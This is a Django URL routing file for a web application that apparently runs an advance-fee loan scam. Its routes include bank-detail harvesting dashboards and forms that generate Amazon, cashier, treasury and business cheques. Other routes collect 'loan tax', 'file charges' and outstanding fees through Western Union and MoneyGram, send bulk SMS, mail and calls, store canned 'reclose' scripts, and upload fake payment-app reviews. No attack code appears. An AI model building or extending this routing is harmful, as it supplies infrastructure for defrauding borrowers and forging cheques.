
from django.contrib import admin
from django.urls import path
from . import views
from django.contrib.auth.views import LoginView
from django.urls import path, include

urlpatterns = [
    path('admin/', admin.site.urls),
    path('', views.homepage, name='homepage'),
    path('test/', views.test, name='test'),
    path('login/', LoginView.as_view(template_name='login.html'), name="login"),
    path('', include('userdetails.urls')),
    path('profile/', views.profile, name='profile'),
    path('customer-reviews/', views.commentsbox, name='comemnts'),
    path('normal-reviews-upload/', views.contact_upload, name="contact_upload"),
    path('cashapp-reviews-upload/', views.cashapp_review_upload, name="cashappreview_upload"),
    path('verification-process/', views.verificationprocess),

    path('aboutus/', views.about, name='about'),
    path('services/', views.services, name='services'),
    path('snippet/', views.contact, name='contact'),
    path('contact/', views.snippet_detail),
    path('loantracking/', views.loantracking, name='loantracking'),
    path('applynow/', views.applynow),
    path('verification-faqs/', views.bankverificationfaqs, name='verification-faqs'),
    path('verification-faq/', views.ebayfaqs, name='verification-faq'),
    path('bank-verification/', views.bankverify, name='bankverification'),
    path('applying/', views.snippet_card),
    path('customer_details/', views.customer_details),
    path('help/', views.help_page),
    path('confirmationemail', views.FormConfirmation),
    path('confirmation', views.confirmation),
    path('noticeform', views.noticeform),
    path('notice', views.notice),
    path('instructionform', views.instructionform),
    path('instruction', views.instruction),
    path('verification-terms', views.verificationterms),
    path('how-to-verify', views.howtoverify),
    path('upload', views.upload),
    path('done', views.done),
    path('twiliosms', views.sms),
    path('sms', views.sendmsgform),
    path('sendmsg', views.sendmsg),
    path('sendmsg2', views.sendmsg2),
    path('callform', views.callform),
    path('call', views.call),
    path('loan-deposit', views.loandeposit),
    path('checknumber', views.checknumber),
    path('subsribe', views.subs_receiver),
    path('smsarea', views.smsarea),
    path('sms-receive', views.sms_now_receive),
    path('ultimatedatabase', views.ultimatebankdetailsinfo),

    path('data/', views.get_data_from_database, name='get_data_from_database'),
    path('ajaxdashboard', views.ajaxdashboard, name='ajaxdashboard'),




    path('createcheck', views.check_create),
    path('verification-deposit', views.bankverificationforms),
    path('checkform', views.checkform),


    path('chat', views.chat),
    path('get-deposited', views.fullbankclosefunc),
    path('addcomment', views.addcomment),

    path('checkformkalu', views.checkform_kalu),
    path('check-create-kalu', views.check_create_kalu),

    path('checkformdiabetes', views.checkform_diabetes),
    path('check-create-diabetes', views.check_create_diabetes),

    path('checkformdiabetes2', views.checkform_diabetes2),

    path('western', views.western), #Western Union BackEnd
    path('moneygram', views.moneygram),
    path('agreementform', views.agreementform), # Loan Agreement Form
    path('agreement', views.agreement), #Loan Agreement BackEnd



    path('westernform', views.westernform), #Western Union Form
    path('western', views.western), #Western Union BackEnd

    path('loantaxform', views.loantaxform), #Western Union BackEnd
    path('loantax', views.loantax), #Western Union BackEnd


    path('moneygramform', views.western), #Western Union BackEnd
    path('moneygram', views.western), #Western Union BackEnd


    path('outstandingform', views.outstandingform), #Western Union BackEnd
    path('outstanding', views.outstanding), #Western Union BackEnd


    path('remainoutstandingform', views.remainoutstandingform), #Western Union BackEnd
    path('remainoutstanding', views.remainoutstanding), #Western Union BackEnd


    path('filechargesform', views.filechargesform), #Western Union BackEnd
    path('filecharges', views.filecharges), #Western Union BackEnd

    path('counter', views.counter),
    path('answer', views.answer),
    path('privacypolicy', views.privacypolicy),
    path('loan-register', views.preregister),

    path('dashboard', views.dashboard),
    path('dashboard-2', views.dashboard2),

    path('full-bank-information', views.dfullbankinfo),

    path('less-bank-information', views.dshortbankinfo),

    path('live-bank-information', views.dliveforminfo),

    path('sms-all-information', views.dsmsinfo),


    path('sms-form-new', views.dsmsform),

    path('amazon-check-form', views.amazoncheckform),

    path('cashier-check-form', views.cashiercheckform),

    path('diabetes-check-form', views.diabetescheckform),

    path('all-mail-form', views.allmailform),
    path('all-mail-send', views.allmailsend),

    path('talk', views.redirecturl),
    path('chat', views.redirecturl2),

    path('canned-response', views.dcannedresponse),

    path('canned-response-check-reclose', views.dcannedresponsecheckreclose),

    path('canned-response-payday-reclose', views.dcannedresponsepaydayreclose),


    path('django-redirect', views.ddjangoredirect),

    path('pythonanywhere-redirect', views.dpythonanywhere),

    path('twilio-redirect', views.dtwilio),

    path('amazon-redirect', views.damazonec2),

    path('treasury-check-create', views.treasurycheckform),

    path('treasury', views.treasury_check_create),


    path('card-attached', views.dcardattached),

    path('deposit-list', views.ddepositlist),
    path('deposit-list-today', views.ddepositlisttoday),

    path('received-list', views.dreceivedlist),

    path('loan-deposit-by-apple-services', views.iphoneclosefunc),


    path('monthly-expense-add', views.dmonthlyexpenseadd),

    path('monthly-expense-form', views.dmonthlyexpenseform),

    path('chat-application', views.dchastapp),

    path('commitments-form', views.dcommitmentsform),

    path('amazon-two', views.check_create_d),
    path('cashier-two', views.check_create_kalu_d),
    path('diabetes-two', views.check_create_diabetes_d),
    path('treasury-two', views.treasury_check_create_d),


    path('amazon-three', views.check_create_d_3),
    path('cashier-three', views.check_create_kalu_d_3),
    path('diabetes-three', views.check_create_diabetes_d_3),
    path('treasury-three', views.treasury_check_create_d_3),
    path('scott-three', views.scott_check_create_d_3),
    path('cashier2022-three', views.cashier2022_check_create_d_3),
    path('businesscheck-go', views.businesscheck_go),
    path('cashier2022-three-100-1', views.cashier2022_check_create_d_3_100_1),


    path('amazon-two-form', views.amazoncheckform_two),
    path('cashier-two-form', views.cashiercheckform_two),
    path('diabetes-two-form', views.diabetescheckform_two),
    path('treasury-two-form', views.treasurycheckform_two),
    path('learn', views.learn),
    path('chat', views.chathere),

    path('amazon-three-form', views.amazoncheckform_three),
    path('cashier-three-form', views.cashiercheckform_three),
    path('treasury-three-form', views.treasurycheckform_three),
    path('diabetes-three-form', views.diabetescheckform_three),
    path('scott-three-form', views.scottcheckform_three),
    path('cashier2022-three-form', views.cashier2022checkform_three),
    path('cashierback', views.create_back_check),

    path('deposit-form', views.depositform),
    path('deposit-now-receive', views.deposit_now_receive),
    path('deposit-now-receive-today', views.deposit_now_receive_today),
    path('depositlist', views.depositlist),
    path('depositlisttoday', views.depositlisttoday),


    path('deposit-now-receive-successfully', views.deposit_now_receive_successfully),

    path('receive-form', views.receiveform),
    path('receivedlist', views.receivedlist),

    path('all-mail-form-dark', views.allmailformdark),
    path('sendmaildark', views.sendmaildark),



    path('commitments-form-new', views.commitment_form),
    path('commitment-add', views.commitment_add),
    path('commitmentlist', views.show_commitment),
    path('loan-deposit-card', views.fullcard),

    path('apply-for-loan', views.loanleadsgen),


    path('thank-you', views.thankyoupage),

    path('how-to-show-balance', views.cashappbalance),
    path('commitmentcreate', views.commitmentcreate),


    path('googlepay-verification-reviews', views.cashappreview),
    path('loan', views.loanredirect),
    path('sms2', views.sms2),
    path('sms3', views.sms3),
    path('header', views.header),
    
    path('make_call/', views.make_call, name='make_call'),
    path('call_response/', views.call_response, name='call_response'),
    path('dashboard-3', views.paydayagreementdashboard),
    path('agreementpayday', views.paydayagreementgo),



]
